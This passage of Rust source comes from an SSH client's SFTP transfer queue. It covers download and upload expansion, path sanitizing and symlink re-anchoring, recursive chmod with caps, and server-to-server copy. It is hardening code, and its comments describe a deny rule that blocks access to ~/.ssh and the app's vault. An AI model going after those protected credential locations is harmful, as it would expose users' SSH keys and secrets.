    let mut path = root.to_path_buf();
    for part in rel {
        path = safe_join_under(root, &path, part)?;
    }
    Some(path)
}

/// Expand one remote path the user picked into download jobs: a file becomes
/// one, a folder is walked (see [`plan_download`]) and its local directories
/// are created - only after the whole walk succeeded, and each re-anchored at
/// its canonical path so a symlink planted locally cannot carry the download
/// out of the destination.
///
/// `root` is the canonicalized user-chosen destination; every local path
/// queued here is verified to stay under it. Only the picked root is `stat`ed
/// (and therefore followed, if it is a link: the user chose it); everything
/// below it comes from the listings.
///
/// Test-only since RU6a: `sftp_queue_add` runs the two halves itself
/// ([`prepare_download`] for every item first, then [`materialize_download`])
/// so one failing item cannot leave local folders behind for the others.
/// (Its tests need the unix-only in-process SFTP server.)
#[cfg(all(test, unix))]
async fn expand_download(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    root: &std::path::Path,
    ctx: &ItemCtx,
    local_name: Option<&str>,
) -> Result<ExpandedDownload, String> {
    expand_download_with(
        sftp,
        remote,
        root,
        ctx,
        local_name,
        &SensitiveLocations::current(),
    )
    .await
}

/// [`expand_download`] with the sensitive locations given.
#[cfg(all(test, unix))]
async fn expand_download_with(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    root: &std::path::Path,
    ctx: &ItemCtx,
    local_name: Option<&str>,
    sensitive: &SensitiveLocations,
) -> Result<ExpandedDownload, String> {
    let prepared = prepare_download(sftp, remote, local_name).await?;
    let mut out = ExpandedDownload::default();
    if let Some(why) = materialize_download(prepared, root, ctx, sensitive, &mut out) {
        out.notes.push(why);
    }
    Ok(out)
}

/// What one picked remote path turned out to be, before anything local
/// exists for it.
enum Prepared {
    /// One file: the server's path, its size and the local name to give it.
    File {
        remote: String,
        size: u64,
        name: String,
    },
    /// A folder and its walk.
    Folder(DownloadPlan),
    /// Nothing to download, and why.
    Skip(String),
}

/// The remote half of [`expand_download`]: STAT the picked path, settle what
/// it is (the STAT alone used to decide, so on a server that leaves the type
/// bits out a folder was queued as one file) and walk it if it is a folder.
/// Touches nothing locally.
async fn prepare_download(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    local_name: Option<&str>,
) -> Result<Prepared, String> {
    let md = sftp
        .metadata(remote)
        .await
        .map_err(|e| format!("stat {remote}: {}", sftp_error_detail(e)))?;
    match picked_root_kind(sftp, remote, &md).await {
        // A link the user picked is followed (STAT follows it), so a picked
        // path is never reported as one; a file it is.
        EntryKind::File | EntryKind::Symlink => {
            // The name comes from the user-picked remote path (not a ReadDir
            // entry), but is sanitized anyway - the path string still
            // originates from the server's view of the filesystem. A
            // renderer-supplied `local_name` (the download-rename conflict
            // action) replaces the basename and goes through the same
            // checks, so a rename cannot escape the destination either.
            let name = local_name.unwrap_or_else(|| remote.rsplit('/').next().unwrap_or("file"));
            Ok(Prepared::File {
                remote: remote.to_string(),
                size: md.size.unwrap_or(0),
                name: name.to_string(),
            })
        }
        EntryKind::Dir => {
            let raw_dir = remote.rsplit('/').next().unwrap_or("dir");
            let Some(root_name) = sanitize_remote_name(raw_dir) else {
                log::warn!(
                    "[sshspan-sftp] skipping download dir {remote}: unsafe local name {raw_dir:?}"
                );
                return Ok(Prepared::Skip(format!(
                    "skipped {remote}: {raw_dir:?} cannot be used as a local folder name"
                )));
            };
            let plan = plan_download(remote, &root_name, |dir| async move {
                list_remote_dir(sftp, &dir).await
            })
            .await?;
            Ok(Prepared::Folder(plan))
        }
        // Reading a FIFO blocks the server until a writer appears.
        EntryKind::Other => Ok(Prepared::Skip(format!(
            "skipped {remote}: not a regular file or folder"
        ))),
        EntryKind::Unknown => Err(format!(
            "Could not tell whether {remote} is a file or a folder (the server does not say), \
             so it was not queued."
        )),
    }
}

/// The local half of [`expand_download`]: create the folders a prepared
/// download needs and turn it into jobs. `root` is the canonical destination.
/// Every FOLDER is checked in full (see [`derived_local_refusal`]) - a
/// refused one is not created and nothing below it is queued - and resolved
/// once it exists; a FILE is then judged by that resolved folder and its own
/// name, without touching the disk (see [`file_write_refusal`]). `Some(reason)`
/// when NOTHING can be made for the item - its file or its folder itself is
/// refused, or it was skipped - so a batch reports it as that item's error
/// rather than as "queued: 0".
fn materialize_download(
    prepared: Prepared,
    root: &std::path::Path,
    ctx: &ItemCtx,
    sensitive: &SensitiveLocations,
    out: &mut ExpandedDownload,
) -> Option<String> {
    let plan = match prepared {
        Prepared::Skip(note) => return Some(note),
        Prepared::File { remote, size, name } => {
            let Some(local) = safe_join_under(root, root, &name) else {
                log::warn!(
                    "[sshspan-sftp] skipping download of {remote}: unsafe local name {name:?}"
                );
                return Some(format!(
                    "skipped {remote}: {name:?} cannot be used as a local file name"
                ));
            };
            if let Some(why) = derived_local_refusal_under(root, root, &local, sensitive) {
                return Some(format!("skipped {remote}: {why}"));
            }
            out.items.push(ctx.download(&remote, local, size));
            return None;
        }
        Prepared::Folder(plan) => plan,
    };
    // The picked folder itself (always the first entry) refused: nothing
    // at all is made for this item.
    if let Some(root_dir) = plan.dirs.first() {
        let refused = match join_local(root, &root_dir.rel) {
            Some(path) => derived_local_refusal_under(root, root, &path, sensitive),
            None => Some("its name cannot be used as a local folder name".to_string()),
        };
        if let Some(why) = refused {
            return Some(format!("skipped {}: {why}", root_dir.remote));
        }
    }
    out.notes.extend(plan.notes);

    // The walk is within its caps; now (and only now) touch the disk.
    // `made`: each folder created, with its resolved path.
    let mut made: std::collections::HashMap<PathBuf, PathBuf> = std::collections::HashMap::new();
    let mut rejected: Vec<PathBuf> = Vec::new();
    for dir in &plan.dirs {
        let Some(path) = join_local(root, &dir.rel) else {
            continue;
        };
        if rejected.iter().any(|r| path.starts_with(r)) {
            continue;
        }
        if let Some(why) = derived_local_refusal_under(root, root, &path, sensitive) {
            out.notes.push(format!(
                "skipped {} and everything in it: {why}",
                dir.remote
            ));
            rejected.push(path);
            continue;
        }
        let created = std::fs::create_dir_all(&path);
        // create_dir_all may have been steered through a symlinked directory
        // (planted locally, or created by another queued job): re-anchor at
        // the canonical path and refuse anything that leaves the destination.
        let real = canonical(&path)
            .ok()
            .filter(|real| super::path_starts_with(real, root));
        match (created, real) {
            (Ok(()), Some(real)) => {
                made.insert(path, real);
            }
            _ => {
                log::warn!(
                    "[sshspan-sftp] skipping download dir {}: could not be created under {}",
                    path.display(),
                    root.display()
                );
                out.notes.push(format!(
                    "skipped {}: could not be created locally",
                    path.display()
                ));
                rejected.push(path);
            }
        }
    }
    for file in plan.files {
        let Some(path) = join_local(root, &file.rel) else {
            continue;
        };
        if rejected.iter().any(|r| path.starts_with(r)) {
            continue;
        }
        match file_write_refusal(&path, &made, sensitive) {
            Some(why) => out.notes.push(format!("skipped {}: {why}", file.remote)),
            None => out.items.push(ctx.download(&file.remote, path, file.size)),
        }
    }
    None
}

/// Why a file of a folder download must not be written, judged without
/// touching the disk: its folder was checked in full and resolved when it was
/// made (`made`: folder -> resolved folder), so the file's resolved path is
/// that folder plus the file's own name. (A link already sitting at the
/// file's path is replaced, never written through: the queue writes a fresh
/// `<name>.part` without following links and renames it over the name.)
fn file_write_refusal(
    path: &std::path::Path,
    made: &std::collections::HashMap<PathBuf, PathBuf>,
    sensitive: &SensitiveLocations,
) -> Option<String> {
    let real_dir = path.parent().and_then(|dir| made.get(dir));
    let (Some(real_dir), Some(name)) = (real_dir, path.file_name()) else {
        return Some("its folder could not be created locally".to_string());
    };
    if !name.to_str().is_some_and(is_plain_local_name) {
        return Some(
            "its local path would not be a plain file name inside the destination folder"
                .to_string(),
        );
    }
    sensitive
        .path_refusal(path, &real_dir.join(name), LocalAccess::Write)
        .map(str::to_string)
}

/// Give every download of one `sftp_queue_add` batch a local path no other job
/// of the batch writes to (A7-57). Two remote names can map to ONE local path:
/// `back:up` and `back_up` both sanitize to `back_up`, and `README` / `readme`
/// are the same file on a case-insensitive filesystem. The jobs then share one
/// `<name>.part` and run concurrently, so one file is silently lost or the
/// interleaved writers produce a corrupt file that still passes the size check.
/// The later job is renamed `name (1).ext` (then `(2)`...), and each rename is
/// reported.
///
/// Case is folded on EVERY platform: whether the destination is
/// case-insensitive cannot be told from the OS (a Linux download folder can be
/// exFAT, NTFS or an SMB share; macOS volumes default to case-insensitive). On
/// a genuinely case-sensitive disk this renames one of two distinct files, a
/// visible and reported cost, where the alternative is silently losing one.
fn dedupe_local_targets(items: &mut [QueuedItem]) -> Vec<String> {
    let key = |path: &str| path.to_lowercase();
    let mut taken: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut notes = Vec::new();
    for item in items.iter_mut().filter(|i| i.kind == JobKind::Download) {
        if taken.insert(key(&item.local_path)) {
            continue;
        }
        let original = item.local_path.clone();
        let renamed = (1u32..)
            .map(|n| numbered_local_name(&original, n))
            .find(|candidate| taken.insert(key(candidate)))
            .expect("an unbounded counter always yields a free name");
        notes.push(format!(
            "{original} was saved as {renamed}: another download of this batch has the same local name"
        ));
        item.local_path = renamed;
    }
    notes
}

/// `dir/name.ext` → `dir/name (n).ext` (`.bashrc` → `.bashrc (1)`,
/// `x.tar.gz` → `x.tar (1).gz`).
fn numbered_local_name(path: &str, n: u32) -> String {
    let p = std::path::Path::new(path);
    let stem = p
        .file_stem()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let name = match p.extension() {
        Some(ext) => format!("{stem} ({n}).{}", ext.to_string_lossy()),
        None => format!("{stem} ({n})"),
    };
    match p.parent() {
        Some(dir) => dir.join(name).display().to_string(),
        None => name,
    }
}

/// What a recursive chmod did.
#[derive(Debug, Default)]
struct ChmodOutcome {
    changed: u32,
    failed: Notes,
    skipped_links: u32,
}

/// Depth a recursive chmod descends (see [`DOWNLOAD_MAX_DEPTH`]).
const CHMOD_MAX_DEPTH: usize = 64;
/// Entries a recursive chmod walks. Far above the download cap because the
/// walk keeps nothing but a counter, but still bounded: a hostile server can
/// invent an endless tree.
const CHMOD_MAX_ENTRIES: usize = 200_000;

/// Apply `apply` to every entry below `root` (A7-20), parent before children
/// so a directory made searchable is searchable by the time the walk
/// descends. Symlinks are SKIPPED: SETSTAT follows a link, so chmod'ing one
/// changes its target - a link to a directory would receive a file mode and
/// lose its search bit, a link out of the tree would change files outside it.
/// (GNU `chmod -R` skips them for the same reason.) A refused entry or an
/// unlistable folder is recorded and the walk goes on, instead of stopping at
/// the first error and leaving a half-applied tree with no account of what
/// changed. `apply` gets each entry's kind (see [`chmod_path`] for what it
/// does with it). `root` itself is the caller's business.
async fn chmod_walk<L, LF, A, AF>(
    root: &str,
    mut list: L,
    mut apply: A,
    apply_files: bool,
    apply_dirs: bool,
) -> ChmodOutcome
where
    L: FnMut(String) -> LF,
    LF: Future<Output = Result<Vec<ListedEntry>, String>>,
    A: FnMut(String, EntryKind) -> AF,
    AF: Future<Output = Result<(), String>>,
{
    let mut out = ChmodOutcome::default();
    let mut stack: Vec<(String, usize)> = vec![(root.to_string(), 0)];
    let mut seen = 0usize;
    'walk: while let Some((dir, depth)) = stack.pop() {
        let listing = match list(dir.clone()).await {
            Ok(listing) => listing,
            Err(e) => {
                out.failed.push(format!("{dir}: {e}"));
                continue;
            }
        };
        for entry in listing {
            seen += 1;
            if seen > CHMOD_MAX_ENTRIES {
                out.failed.push(format!(
                    "stopped after {CHMOD_MAX_ENTRIES} entries; the rest was not changed"
                ));
                break 'walk;
            }
            let child = join_remote(&dir, &entry.name);
            let wanted = match entry.kind {
                EntryKind::Symlink => {
                    out.skipped_links += 1;
                    continue;
                }
                EntryKind::Unknown => {
                    out.failed.push(match &entry.why {
                        Some(why) => format!(
                            "{child}: not changed (could not tell whether it is a file or a folder: {why})"
                        ),
                        None => format!(
                            "{child}: not changed (the server does not say whether it is a file or a folder)"
                        ),
                    });
                    continue;
                }
                EntryKind::Dir => apply_dirs,
                EntryKind::File | EntryKind::Other => apply_files,
            };
            if entry.kind == EntryKind::Dir && depth >= CHMOD_MAX_DEPTH {
                out.failed.push(format!(
                    "{child}: not changed (nested deeper than {CHMOD_MAX_DEPTH} levels)"
                ));
                continue;
            }
            if wanted {
                match apply(child.clone(), entry.kind).await {
                    Ok(()) => out.changed += 1,
                    Err(e) => out.failed.push(e),
                }
            }
            if entry.kind == EntryKind::Dir {
                stack.push((child, depth + 1));
            }
        }
    }
    out
}

/// Add transfers to the background queue. `items` is a list of
/// `{local, remote}` pairs plus a direction; directories are expanded
/// recursively. Requires a destination directory for downloads.
#[tauri::command]
pub async fn sftp_queue_add(
    app: AppHandle,
    session_id: String,
    direction: String,             // "upload" | "download"
    items: Vec<serde_json::Value>, // [{local, remote}] - remote for downloads may be a dir
    dest_dir: Option<String>,      // local dir for downloads
    resume: Option<String>, // "overwrite" | "resume" | "ask" (default: setting.sftpResumeDefault)
    preserve_ts: Option<bool>, // keep the source mtime: remote on uploads, local on downloads
) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    // Parse explicitly and reject anything else.
    //
    // This used to be `if direction == "upload" { Upload } else { Download }`,
    // with an `if !matches!(kind, Upload | Download)` guard after it. That
    // guard could never fire - `kind` was only ever one of those two - so the
    // "unsupported direction" error was dead code, and every unrecognised
    // value (a typo, a renamed constant, anything a compromised renderer
    // sends) silently became a DOWNLOAD instead of an error.
    //
    // It granted no capability the renderer did not already have by simply
    // sending "download", so this is fail-open in shape rather than a
    // privilege issue. It is still the wrong default for an untrusted input:
    // unrecognised should mean refused. ServerCopy is enqueued via
    // `sftp_server_copy`, never here, so it is not accepted either.
    let kind = match direction.as_str() {
        "upload" => JobKind::Upload,
        "download" => JobKind::Download,
        other => {
            return Err(CmdError(format!(
                "unsupported transfer direction {other:?}; expected \"upload\" or \"download\"."
            )))
        }
    };
    // Ask/Overwrite/Resume - resolved once here, threaded into every
    // expanded job. An item may override it (`resume` on the item object):
    // the renderer resolves conflicts per file in its dialog, so a batch can
    // legitimately contain "skip this one, resume that one". Without the
    // per-item read the batch-wide value won and every dialog decision was
    // silently flattened to it.
    //
    // The default comes from the settings (a database read) and the
    // protected locations are resolved once for the whole batch (filesystem
    // work): both off the async runtime.
    let (batch_resume, sensitive) = {
        let (app, resume) = (app.clone(), resume.clone());
        tokio::task::spawn_blocking(move || {
            (
                resolve_resume_mode(&app, resume.as_deref()),
                SensitiveLocations::current(),
            )
        })
        .await
        .map_err(|e| CmdError(format!("Could not prepare the transfer: {e}")))?
    };
    let preserve_ts = preserve_ts.unwrap_or(false);
    let server_name = app
        .state::<StdArc<SessionRegistry>>()
        .list()
        .into_iter()
        .find(|(id, _, _, _, _)| id == &session_id)
        .map(|(_, name, _, _, _)| name)
        .unwrap_or_default();

    let batch = BatchCtx {
        session_id: &session_id,
        server_name: &server_name,
        resume: batch_resume,
        preserve_ts,
    };
    let expansion = match kind {
        JobKind::Upload => {
            // A local walk of possibly thousands of files: a blocking task.
            let (session_id, server_name) = (session_id.clone(), server_name.clone());
            let sensitive = Arc::clone(&sensitive);
            tokio::task::spawn_blocking(move || {
                let batch = BatchCtx {
                    session_id: &session_id,
                    server_name: &server_name,
                    resume: batch_resume,
                    preserve_ts,
                };
                expand_upload_batch(&items, &batch, &sensitive)
            })
            .await
            .map_err(|e| CmdError(format!("Could not prepare the upload: {e}")))?
            .map_err(CmdError)?
        }
        JobKind::Download => {
            let sftp = sftp_from_session(&app, &session_id)?;
            let dest = dest_dir
                .map(PathBuf::from)
                .unwrap_or_else(crate::sftp::edit_temp_dir);
            // Renderer-supplied destination: run the same app-data/system
            // gate the single-file download uses (plus the write deny-list),
            // BEFORE any directory is created - dest_dir must not be able to
            // aim the batch at the vault directory or at `~/.ssh`.
            validate_sftp_local_path_with(&dest.to_string_lossy(), LocalAccess::Write, &sensitive)?;
            expand_download_batch(&sftp, &items, &dest, &batch, Arc::clone(&sensitive))
                .await
                .map_err(CmdError)?
        }
        // ServerCopy never reaches here (guarded above).
        JobKind::ServerCopy => unreachable!("guarded above"),
    };

    // Things the expansion skipped (symbolic links, unreadable folders, names
    // that cannot be used locally, renamed collisions). Always present; an
    // empty array means a clean expansion.
    let warnings = expansion.warnings();
    let BatchExpansion { jobs, outcomes, .. } = expansion;
    // Every item failed: the call fails, with each item's reason.
    if let Some(failure) = batch_failure(&outcomes) {
        return Err(CmdError(failure));
    }
    let count = jobs.len();
    if count == 0 {
        return Ok(serde_json::json!({
            "ok": true, "added": 0, "warnings": warnings, "items": outcomes,
        }));
    }
    q_enqueue(&app, jobs);
    Ok(serde_json::json!({
        "ok": true, "added": count, "warnings": warnings, "items": outcomes,
    }))
}

/// What every item of one `sftp_queue_add` call shares.
struct BatchCtx<'a> {
    session_id: &'a str,
    server_name: &'a str,
    /// The batch-wide resume mode; an item may override it.
    resume: ResumeMode,
    preserve_ts: bool,
}

/// Whether one picked item was queued.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
enum ItemStatus {
    Queued,
    Error,
}

/// The result of one picked item of a `sftp_queue_add` call.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
struct ItemOutcome {
    /// The item as it was picked: the remote path of a download, the local
    /// path of an upload.
    path: String,
    status: ItemStatus,
    /// Transfers queued for it (a folder can be many, or none if it is empty).
    added: usize,
    /// Why nothing was queued for it: a sentence naming the item.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// What was left out of it, and why.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    warnings: Vec<String>,
}

impl ItemOutcome {
    fn queued(path: &str, added: usize) -> Self {
        Self {
            path: path.to_string(),
            status: ItemStatus::Queued,
            added,
            error: None,
            warnings: Vec::new(),
        }
    }

    fn failed(path: &str, error: String) -> Self {
        Self {
            path: path.to_string(),
            status: ItemStatus::Error,
            added: 0,
            error: Some(error),
            warnings: Vec::new(),
        }
    }
}

impl BatchExpansion {
    /// Record a failed item. Its reason also goes into the warnings (see
    /// [`Self::warnings`]), which renderers that do not read `items` yet
    /// already show.
    fn fail(&mut self, path: &str, error: String) {
        self.errors.push(error.clone());
        self.outcomes.push(ItemOutcome::failed(path, error));
    }

    /// Record a queued item: its jobs, and what its walk left out - the
    /// item's own warnings, and the batch's.
    fn queued(&mut self, path: &str, jobs: Vec<QueuedItem>, notes: Notes) {
        let mut outcome = ItemOutcome::queued(path, jobs.len());
        outcome.warnings = notes.to_vec();
        self.outcomes.push(outcome);
        self.jobs.extend(jobs);
        self.notes.extend(notes);
    }

    /// The `warnings` of the `sftp_queue_add` result: every failed item's
    /// error first, never dropped, then the walks' notes (capped, see
    /// [`Notes`]). The errors used to share the cap with the notes, so the
    /// notes of one big folder (30 skipped links) hid another pick's error.
    fn warnings(&self) -> Vec<String> {
        self.errors
            .iter()
            .cloned()
            .chain(self.notes.to_vec())
            .collect()
    }
}

/// Everything one `sftp_queue_add` call expanded to.
#[derive(Default)]
struct BatchExpansion {
    jobs: Vec<QueuedItem>,
    /// Why each failed item failed, one sentence per item.
    errors: Vec<String>,
    /// What the walks left out.
    notes: Notes,
    outcomes: Vec<ItemOutcome>,
}

/// The error a `sftp_queue_add` call fails with when every item failed (one
/// line per item); `None` when at least one was queued - an empty folder
/// counts - or there were no items.
fn batch_failure(outcomes: &[ItemOutcome]) -> Option<String> {
    let errors: Vec<&str> = outcomes.iter().filter_map(|o| o.error.as_deref()).collect();
    (!outcomes.is_empty() && errors.len() == outcomes.len()).then(|| errors.join("\n"))
}

/// Whether an upload source can be read at all: it exists, and a folder can
/// be listed. (The walk skips what it cannot read, so a missing pick used to
/// vanish without a word.)
fn readable_upload_source(local: &str) -> Result<(), String> {
    let md = std::fs::symlink_metadata(local)
        .map_err(|e| format!("{local}: could not be read ({e})."))?;
    if md.is_dir() {
        std::fs::read_dir(local).map_err(|e| format!("{local}: could not be read ({e})."))?;
    }
    Ok(())
}

/// The `local` and `remote` of one renderer-supplied item; empty when absent.
fn item_paths(item: &serde_json::Value) -> (&str, &str) {
    let field = |key: &str| item.get(key).and_then(|v| v.as_str()).unwrap_or_default();
    (field("local"), field("remote"))
}

/// Expand the upload items of one `sftp_queue_add` call. Blocking (it walks
/// local folders): run it off the async runtime.
fn expand_upload_batch(
    items: &[serde_json::Value],
    batch: &BatchCtx<'_>,
    sensitive: &SensitiveLocations,
) -> Result<BatchExpansion, String> {
    let mut out = BatchExpansion::default();
    for item in items {
        let (local, remote) = item_paths(item);
        if local.is_empty() || remote.is_empty() {
            continue;
        }
        // The read rules (`LocalAccess::Read`): the source must not be in
        // the app data dir (the vault), a system directory or SSHSpan's
        // configuration folder, nor anywhere under `~/.ssh` except a `*.pub`
        // public key. A refused or unreadable pick is that item's result,
        // not the end of the batch: one `~/.ssh/config` among the picks used
        // to queue nothing at all.
        if let Err(e) = validate_sftp_local_path_with(local, LocalAccess::Read, sensitive) {
            out.fail(local, format!("{local}: {}", e.0));
            continue;
        }
        if let Err(e) = readable_upload_source(local) {
            out.fail(local, e);
            continue;
        }
        let ctx = ItemCtx::new(item, batch);
        match expand_upload(std::path::Path::new(local), remote, &ctx, sensitive) {
            Ok((jobs, notes)) => out.queued(local, jobs, notes),
            Err(why) => out.fail(local, format!("{local}: {why}")),
        }
    }
    Ok(out)
}

/// The local half of [`expand_download_batch`] (blocking filesystem work):
/// create `dest` only if some item has something to download, anchor every
/// local path at its canonical form, and turn each prepared item into jobs.
fn materialize_download_batch(
    prepared: Vec<(String, ItemCtx, Result<Prepared, String>)>,
    dest: &std::path::Path,
    sensitive: &SensitiveLocations,
) -> Result<BatchExpansion, String> {
    let wanted = prepared
        .iter()
        .any(|(_, _, r)| matches!(r, Ok(Prepared::File { .. }) | Ok(Prepared::Folder(_))));
    // Anchor every queued local path at the canonical destination: the
    // remote names are joined onto this root and the result is verified to
    // stay under it.
    let root = if wanted {
        let _ = std::fs::create_dir_all(dest);
        Some(canonical(dest).map_err(|e| {
            format!(
                "The download folder {} cannot be used ({e}) - choose another folder.",
                dest.display()
            )
        })?)
    } else {
        None
    };
    let mut out = BatchExpansion::default();
    for (remote, ctx, result) in prepared {
        match (result, &root) {
            (Err(e), _) => out.fail(&remote, e),
            (Ok(Prepared::Skip(why)), _) => out.fail(&remote, why),
            (Ok(prepared), Some(root)) => {
                let mut expanded = ExpandedDownload::default();
                // A refused item made nothing: no jobs, no notes.
                match materialize_download(prepared, root, &ctx, sensitive, &mut expanded) {
                    Some(why) => out.fail(&remote, why),
                    None => out.queued(&remote, expanded.items, expanded.notes),
                }
            }
            // `wanted` was true for every File/Folder, so a root exists.
            (Ok(_), None) => unreachable!("a destination is created for every item to download"),
        }
    }
    Ok(out)
}

/// Expand the download items of one `sftp_queue_add` call into `dest`.
async fn expand_download_batch(
    sftp: &russh_sftp::client::SftpSession,
    items: &[serde_json::Value],
    dest: &std::path::Path,
    batch: &BatchCtx<'_>,
    sensitive: Arc<SensitiveLocations>,
) -> Result<BatchExpansion, String> {
    // The remote half for EVERY item first: one picked folder that cannot be
    // listed used to fail the whole call after the local folders of the
    // items before it had been created. Now it is that item's error, nothing
    // local is made for it, and the destination itself is only created once
    // there is something to put in it.
    let mut prepared: Vec<(String, ItemCtx, Result<Prepared, String>)> = Vec::new();
    for item in items {
        let (_, remote) = item_paths(item);
        if remote.is_empty() {
            continue;
        }
        // Download-side rename: the renderer resolves a conflict to a
        // free local name and passes it here. Only the FILE case can
        // use it (a directory expands into many names).
        let local_name = item
            .get("localName")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        let result = prepare_download(sftp, remote, local_name).await;
        prepared.push((remote.to_string(), ItemCtx::new(item, batch), result));
    }
    // The local half - creating folders, checking every local path - is
    // filesystem work: off the async runtime, in one blocking task.
    let dest = dest.to_path_buf();
    let mut out = tokio::task::spawn_blocking(move || {
        materialize_download_batch(prepared, &dest, &sensitive)
    })
    .await
    .map_err(|e| format!("preparing the download failed: {e}"))??;
    // Two remote names can map to one local path (sanitising `back:up`
    // and `back_up`, or `README` / `readme` on a case-insensitive disk,
    // which any destination might be): the jobs would share one `.part`
    // and clobber each other (A7-57).
    for note in dedupe_local_targets(&mut out.jobs) {
        out.notes.push(note);
    }
    Ok(out)
}

#[tauri::command]
pub fn sftp_queue_list(app: AppHandle) -> CmdResult<serde_json::Value> {
    let _ = &app;
    emit_queue(&app);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_cancel(app: AppHandle, job_id: u64) -> CmdResult<serde_json::Value> {
    tfq::cancel_job(&app, job_id);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_retry(app: AppHandle, job_id: u64) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    q_retry(&app, job_id);
    Ok(serde_json::json!({ "ok": true }))
}

/// Suspend one transfer without losing its place: an active job winds down at
/// the next chunk boundary and its `.part` is left where it stands, so
/// resuming continues rather than restarting. Distinct from cancel, which
/// abandons the partial.
#[tauri::command]
pub fn sftp_queue_pause(app: AppHandle, job_id: u64) -> CmdResult<serde_json::Value> {
    tfq::pause_job(&app, job_id);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_resume(app: AppHandle, job_id: u64) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    tfq::resume_job(&app, job_id);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_pause_all(app: AppHandle) -> CmdResult<serde_json::Value> {
    tfq::pause_all(&app);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_resume_all(app: AppHandle) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    tfq::resume_all(&app);
    Ok(serde_json::json!({ "ok": true }))
}

/// Cap total transfer throughput across every worker. 0 means unlimited.
/// Takes effect on in-flight transfers, not just newly started ones.
#[tauri::command]
pub fn sftp_queue_set_rate_limit(
    app: AppHandle,
    bytes_per_sec: u64,
) -> CmdResult<serde_json::Value> {
    tfq::set_rate_limit(&app, bytes_per_sec);
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub fn sftp_queue_clear_finished(app: AppHandle) -> CmdResult<serde_json::Value> {
    q_clear(&app);
    Ok(serde_json::json!({ "ok": true }))
}

/// Server-to-server copy ("Send to <server>"): enqueue one ServerCopy job
/// that downloads from the source session and uploads to the target session,
/// each on its own FRESH SFTP channel (the interactive browse sessions are
/// never used - some servers fail reads on the long-lived channel with
/// SSH_FX_FAILURE). The transfer queue panel shows progress; a temp staging
/// file is created by the worker and always removed on completion.
///
/// Directories are expanded recursively into per-file jobs (a directory
/// cannot be read as a file - reading one fails at offset 0). Each child file
/// keeps the folder structure under `<target_dir>/<dir-name>/...`. Directory
/// names come from the source server's listing, so every remote path segment
/// is passed through `sanitize_remote_name` before it is joined into the
/// target path (defense-in-depth against a hostile source server planting
/// `..` segments in the destination path).
#[tauri::command]
pub async fn sftp_server_copy(
    app: AppHandle,
    from_session_id: String,
    remote: String,
    target_session_id: String,
    target_dir: String,
) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    if from_session_id == target_session_id {
        return Err(CmdError(
            "Source and target are the same connection.".into(),
        ));
    }
    if remote.is_empty() || target_dir.is_empty() {
        return Err(CmdError(
            "Source path and target directory are required.".into(),
        ));
    }
    let registry = app.state::<StdArc<SessionRegistry>>();
    let server_name = |sid: &str| {
        registry
            .list()
            .into_iter()
            .find(|(id, _, _, _, _)| id == sid)
            .map(|(_, name, _, _, _)| name)
    };
    let Some(source_server) = server_name(&from_session_id) else {
        return Err(CmdError("Source session not found.".into()));
    };
    let Some(target_server) = server_name(&target_session_id) else {
        return Err(CmdError("Target session not found.".into()));
    };

    // Open a fresh channel to the source to stat + walk (mirrors expand_download).
    let sftp = crate::sftp::queue::open_transfer_channel(&app, &from_session_id)
        .await
        .map_err(CmdError)?;
    let is_dir = server_copy_root_is_dir(&sftp, &remote)
        .await
        .map_err(CmdError)?;

    let name = remote.rsplit('/').next().unwrap_or("file");
    let base_target = format!("{}/{}", target_dir.trim_end_matches('/'), name);

    if is_dir {
        // Stream the walk: enqueue per-file jobs in batches as the tree is
        // scanned so transfers start immediately (workers run in parallel with
        // the walk) instead of waiting for a full scan of a huge tree. The
        // command returns after the scan completes; scan errors surface here
        // while already-queued jobs keep running.
        let visited = std::sync::Arc::new(std::sync::Mutex::new(std::collections::HashSet::new()));
        let scanned = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let enqueue = |batch: Vec<QueuedItem>| q_enqueue(&app, batch);
        let walk = expand_server_copy(
            &enqueue,
            &sftp,
            remote,
            base_target.clone(),
            from_session_id,
            source_server,
            target_session_id,
            target_server,
            visited,
            scanned.clone(),
        );
        // Progress-aware bound, not a flat wall-clock cap: a large tree on a
        // slow-but-advancing source (e.g. mailcow-dockerized) must not be
        // killed just because the whole scan takes longer than a fixed
        // ceiling. The walk streams batches into the queue; `scanned` only
        // advances on each enqueue, so a STALLED scan stops advancing it. Poll
        // for progress: abort only when no new files have been enqueued for
        // SCAN_STALL_WINDOW, otherwise let a long scan run.
        const SCAN_STALL_WINDOW: std::time::Duration = std::time::Duration::from_secs(60);
        tokio::pin!(walk);
        let mut last_count = 0usize;
        let mut stalled_since: Option<std::time::Instant> = None;
        let walk_result = loop {
            tokio::select! {
                res = &mut walk => break Some(res),
                _ = tokio::time::sleep(std::time::Duration::from_secs(2)) => {
                    let n = scanned.load(std::sync::atomic::Ordering::SeqCst);
                    if n != last_count {
                        last_count = n;
                        stalled_since = None; // progress made; reset the stall clock
                    } else {
                        let since = stalled_since.get_or_insert_with(std::time::Instant::now);
                        if since.elapsed() >= SCAN_STALL_WINDOW {
                            break None; // genuinely stalled - abort the walk
                        }
                    }
                }
            }
        };
        match walk_result {
            Some(Ok(())) => {}
